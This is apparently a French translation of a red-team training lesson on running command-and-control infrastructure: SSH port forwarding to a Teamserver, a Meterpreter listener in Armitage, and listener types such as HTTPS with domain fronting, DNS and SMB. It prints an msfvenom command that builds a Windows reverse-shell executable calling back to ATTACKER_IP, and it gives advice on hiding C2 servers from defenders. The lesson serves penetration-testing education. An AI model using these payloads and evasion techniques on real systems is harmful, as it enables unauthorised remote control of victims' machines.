### Accéder et gérer votre infrastructure C2

Maintenant que nous avons une idée générale de la configuration d'un serveur C2 , nous allons passer en revue certains détails opérationnels de base que vous devez connaître lorsque vous accédez à votre serveur C2. Il est important de noter que vous n'êtes pas obligé d'effectuer des actions dans cette tâche - Ceci est destiné à acquérir une expérience générale et une familiarité avec les cadres de commandement et de contrôle.

Sécurité opérationnelle de base

Nous en avons brièvement parlé dans la dernière section ; Vous ne devez jamais avoir votre interface de gestion C2 directement accessible. C'est principalement pour vous d'améliorer la sécurité opérationnelle. Il peut être incroyablement facile d'identifier les serveurs C2. Par exemple, dans les versions antérieures à 3.13, les serveurs Cobalt Strike C2 pouvaient être identifiés par un espace supplémentaire (\x20) à la fin de la réponse HTTP. En utilisant cette tactique, de nombreux Blue Teamers pourraient prendre les empreintes digitales de tous les serveurs Cobalt Strike C2 accessibles au public. Pour plus d'informations sur la prise d'empreintes digitales et l'identification des serveurs Cobalt Strike C2, consultez cet article publié sur le [blog Recorded Future](https://www.recordedfuture.com/cobalt-strike-servers/) .

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e81ca61b06e861e6f3a4f58660cc2e76.png)

*Capture d'écran d'un éditeur hexadécimal illustrant l'espace supplémentaire à la fin d'une réponse HTTP*

Le point en mentionnant cela est que vous voulez réduire autant que possible votre risque de sécurité opérationnelle. Si cela signifie que l'interface de gestion de votre serveur C2 n'est pas accessible au public, alors, par tous les moyens, vous devriez le faire.

Accéder à votre serveur C2 distant qui écoute localement

Cette section se concentrera sur la façon d'accéder en toute sécurité à votre serveur C2 par redirection de port SSH ; Si vous avez déjà effectué une redirection de port avec SSH, n'hésitez pas à ignorer cette section, vous n'apprendrez peut-être rien de nouveau. Pour ceux qui ne sont pas familiers, le transfert de port SSH nous permet soit d'héberger des ressources sur une machine distante en transférant un port local vers le serveur distant, soit d'accéder à des ressources locales sur la machine distante à laquelle nous nous connectons. Dans certaines circonstances, cela peut être pour contourner les pare-feu.

![bc96eabae5235e893e22417d2cc2301f](https://github.com/dsgsec/Red-Team/assets/82456829/e9e0534d-c0c2-45e9-8bbd-10ee4ced56d7)

*Le pare-feu bloque TCP/8080*

*\
*

Ou, dans notre cas, cela pourrait être fait pour des raisons de sécurité opérationnelle.

*\
*

*
![7edda600836d41987311316908354439](https://github.com/dsgsec/Red-Team/assets/82456829/4b5e9161-2921-43c8-8647-163fc809339a)

*Le pare-feu autorise TCP/22, nous permettant d'accéder à TCP/8080 via TCP/22*

Maintenant que nous comprenons mieux pourquoi nous voulons transférer le port SSH, passons en revue le comment.

Dans notre configuration C2 à partir de la tâche 4, notre Teamserver écoute sur localhost sur TCP/55553. Afin d'accéder au port distant 55553, nous devons configurer un transfert de port local pour transférer notre port local vers le serveur Teamserver distant. Nous pouvons le faire avec le drapeau -L sur notre client SSH :

Transfert de port SSH

```
root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
root@kali$ echo "Connected"
Connected
```

Maintenant que nous avons configuré un transfert de port distant SSH, vous pouvez maintenant vous connecter à votre serveur C2 fonctionnant sur TCP/55553. Pour rappel, Armitage ne prend pas en charge l'écoute sur une interface de bouclage (127.0.0.1-127.255.255.255), il s'agit donc d'un  conseil général de l'administrateur du serveur C2 . Vous trouverez ce conseil plus centré sur les serveurs C2 comme Covenant, Empire et bien d'autres. 

Nous vous recommandons vivement de mettre en place des règles de pare-feu pour les serveurs C2 qui doivent écouter sur une interface publique  afin que seuls les utilisateurs prévus puissent accéder à votre serveur C2 . Il ya différentes manière de faire ceci. Si vous hébergez une infrastructure Cloud, vous pouvez configurer un groupe de sécurité ou utiliser une solution de pare-feu basée sur l'hôte comme UFW ou IPTables.

Créer un écouteur dans Armitage

Ensuite, nous allons passer à un sujet que tous les serveurs C2 ont - c'est la création d'un écouteur. Pour rester dans le sujet, nous montrerons comment configurer un écouteur de base avec Armitage, puis explorerons certains des autres Listeners théoriques que vous pouvez rencontrer dans divers autres cadres C2. Créons un écouteur Meterpreter de base fonctionnant sur TCP/31337. Pour commencer, cliquez sur le menu déroulant Armitage et accédez à la section "Listeners" ; vous devriez voir trois options, Bind, Reverse et set LHOST. Bind fait référence à Bind Shells ; vous devez vous connecter à ces hôtes. Reverse fait référence aux coques inversées standard ; c'est l'option que nous allons utiliser.

![1ad92c6b503433e43a906c0d6719f137](https://github.com/dsgsec/Red-Team/assets/82456829/98c19b0c-3d6f-4e19-bb64-483ea939781d)

*Créer un écouteur dans Armitage*

Après avoir cliqué sur "Inverser", un nouveau menu s'ouvrira, vous invitant à configurer quelques détails de base sur l'écouteur, en particulier le port sur lequel vous souhaitez écouter et le type d'écouteur que vous souhaitez sélectionner. Vous avez le choix entre deux options, "Shell" ou "Meterpreter". Shell fait référence à un shell inversé standard de style netcat, et Meterpreter est le shell inversé standard de Meterpreter.

![f1799890a05592fcc5338efd4edf281b](https://github.com/dsgsec/Red-Team/assets/82456829/f29a62c6-3e1d-4dbb-a8ee-e0b118c0f908)

*Configuration de l'écouteur*

Après avoir appuyé sur Entrée, un nouveau volet s'ouvrira, confirmant que votre écouteur a été créé. Cela devrait ressembler au module exploit/multi/handler standard de Metasploit.

![7bc806ea13495e55eb82fc5c399d8876](https://github.com/dsgsec/Red-Team/assets/82456829/682a36d7-5417-49d6-bb60-2b2b7cff15ab)

*Écouteur configuré avec succès*

Après avoir configuré un écouteur, vous pouvez générer un shell inversé standard windows/meterpreter/reverse_tcp à l'aide de MSFvenom et définir le LHOST sur le serveur Armitage pour recevoir des rappels vers notre serveur Armitage.

Obtenir un rappel

Génération de charge utile MSFVenom

```
root@kali$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

```

Après avoir généré le windows/meterpreter/reverse_tcp à l'aide de MSFVenom, nous pouvons transférer la charge utile vers une machine cible et l'exécuter. Après un moment ou deux, vous devriez recevoir un rappel de la machine.

![1dcc8962d5a595690a9b5ea9c4888dad](https://github.com/dsgsec/Red-Team/assets/82456829/ea280735-f0f8-4311-90e1-fc00be3590ef)

*Rappel de la victime*

Type d'Listener

Comme mentionné précédemment, les écouteurs de shell inversé standard ne sont pas les seuls qui existent ; il existe de nombreuses variétés qui utilisent de nombreux protocoles différents ; cependant, il y en a quelques-uns courants que nous couvrirons, ceux-ci étant les suivants :

Listener standard - 

Ceux-ci communiquent souvent directement via un socket TCP ou UDP brut, en envoyant des commandes en texte clair. Metasploit prend entièrement en charge les Listeners génériques.

Listeners HTTP/HTTPS - 

Ceux-ci se présentent souvent comme une sorte de serveur Web et utilisent des techniques telles que les profils Domain Fronting ou Malleable C2 pour masquer un serveur C2. Lorsque vous communiquez spécifiquement via HTTPS, il est moins probable que les communications soient bloquées par un NGFW. Metasploit prend entièrement en charge les écouteurs HTTP/HTTPS.

Listeners DNS -

Les écouteurs DNS sont une technique populaire spécifiquement utilisée dans la phase d'exfiltration où une infrastructure supplémentaire doit normalement être mise en place, ou à tout le moins, un nom de domaine doit être acheté et enregistré, et un serveur NS public doit être configuré. Il est possible de configurer des opérations DNS C2 dans Metasploit à l'aide d'outils supplémentaires. Pour plus d'informations, consultez cette présentation " [Meterpreter over DNS](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf) " par Alexey Sintsov et Maxim Andreyanov. Ceux-ci sont souvent très utiles pour contourner les proxys réseau.

Listeners PME - 

La communication via des canaux nommés SMB est une méthode de choix populaire, en particulier lorsqu'il s'agit d'un réseau restreint ; il permet souvent un pivotement plus flexible avec plusieurs appareils qui communiquent entre eux et un seul appareil qui revient sur un protocole plus courant comme HTTP/HTTPS. Metasploit prend en charge les canaux nommés.
